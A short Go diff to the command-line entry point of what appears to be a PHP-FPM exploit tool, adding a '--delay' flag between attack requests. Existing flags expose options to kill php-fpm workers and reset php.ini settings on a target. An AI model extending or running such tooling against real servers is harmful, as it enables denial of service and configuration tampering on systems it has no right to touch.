@@ -2,6 +2,7 @@ package main
 
 import (
 	"log"
+	"time"
 
 	"github.com/spf13/cobra"
 )
@@ -19,6 +20,7 @@ func main() {
 		resetRetries int
 		onlyQSL      bool
 		params       = &AttackParams{}
+		delay        time.Duration
 	)
 
 	var cmd = &cobra.Command{
@@ -31,7 +33,7 @@ func main() {
 				log.Fatalf("Unknown detection method: %v", method)
 			}
 
-			requester, err := NewRequester(url, cookie)
+			requester, err := NewRequester(url, cookie, delay)
 			if err != nil {
 				log.Fatalf("Failed to create requester: %v", err)
 			}
@@ -117,6 +119,7 @@ func main() {
 	cmd.Flags().StringVar(&setting, "setting", "", "specify custom php.ini setting for --reset-setting")
 	cmd.Flags().BoolVar(&killWorkers, "kill-workers", false, "just kill php-fpm workers (requires only QSL)")
 	cmd.Flags().IntVar(&killCount, "kill-count", SettingEnableRetries, "how many times to send the worker killing payload")
+	cmd.Flags().DurationVar(&delay, "delay", 0, "delay between requests (applied right after each request). Attacks will take *much* longer!")
 
 	if err := cmd.Execute(); err != nil {
 		log.Fatal(err)
